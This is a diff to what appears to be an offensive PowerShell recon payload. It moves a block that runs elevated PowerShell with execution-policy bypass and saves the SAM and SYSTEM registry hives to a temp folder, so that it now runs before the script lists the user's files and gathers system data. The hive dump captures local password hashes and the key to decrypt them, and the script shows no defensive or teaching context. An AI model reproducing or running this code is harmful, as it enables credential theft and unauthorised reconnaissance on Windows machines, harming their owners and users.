@@ -35,6 +35,14 @@ New-Item -Path $env:tmp/$FolderName -ItemType Directory
 
 ############################################################################################################################################################
 
+#reg save HKLM\sam $env:TEMP\$FolderName/SAM
+Start-Process PowerShell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command `"reg save HKLM\sam $env:TEMP\$FolderName/SAM`"" -Verb RunAs
+
+#reg save HKLM\system $env:TEMP\$FolderName/SYSTEM
+Start-Process PowerShell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command `"reg save HKLM\system $env:TEMP\$FolderName/SYSTEM`"" -Verb RunAs
+
+############################################################################################################################################################
+
 # Recon all User Directories
 tree $Env:userprofile /a /f >> $env:TEMP\$FolderName\tree.txt
 
@@ -425,15 +433,6 @@ $drivers
 "@
 
 $output > $env:TEMP\$FolderName/computerData.txt
-
-############################################################################################################################################################
-
-#reg save HKLM\sam $env:TEMP\$FolderName/SAM
-Start-Process PowerShell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command `"reg save HKLM\sam $env:TEMP\$FolderName/SAM`"" -Verb RunAs
-
-#reg save HKLM\system $env:TEMP\$FolderName/SYSTEM
-Start-Process PowerShell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command `"reg save HKLM\system $env:TEMP\$FolderName/SYSTEM`"" -Verb RunAs
-############################################################################################################################################################
 
 ############################################################################################################################################################
 
